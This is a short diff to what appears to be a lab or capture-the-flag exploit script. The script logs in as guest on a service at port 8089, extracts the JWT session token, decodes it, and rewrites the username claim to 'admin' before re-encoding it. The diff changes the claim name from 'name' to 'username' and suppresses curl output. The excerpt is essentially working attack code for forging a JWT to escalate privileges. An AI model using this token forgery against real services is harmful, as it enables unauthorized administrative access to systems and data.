@@ -31,7 +31,7 @@ curl -s -X GET "http://$target_ip:8089" -L > /dev/null
 
 # Computing hash
 echo "2.2 - LOGIN AS GUEST AND GET TOKEN"
-curl -s -X POST "http://$target_ip:8089/login" -c "/work/8-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "user=guest" -d "pass=guest"
+curl -s -X POST "http://$target_ip:8089/login" -c "/work/8-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "user=guest" -d "pass=guest" > /dev/null
 TOKEN=$(grep jwt-session "/work/8-cookies.txt" | awk '{print $7}')
 echo "--> Token retrieved : $TOKEN"
 
@@ -42,7 +42,7 @@ PAYLOAD=$(echo "$TOKEN" | awk -F. '{print $2}' | base64 -d)
 echo "--> Decoded token header : $HEADER"
 echo "--> Decoded token payload : $PAYLOAD"
 
-MODIFIED_PAYLOAD=$(echo "$PAYLOAD" | jq '.name = "admin"')
+MODIFIED_PAYLOAD=$(echo "$PAYLOAD" | jq '.username = "admin"')
 echo "--> Modified token payload : $MODIFIED_PAYLOAD"
 ENCODED_HEADER=$(echo "$HEADER" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
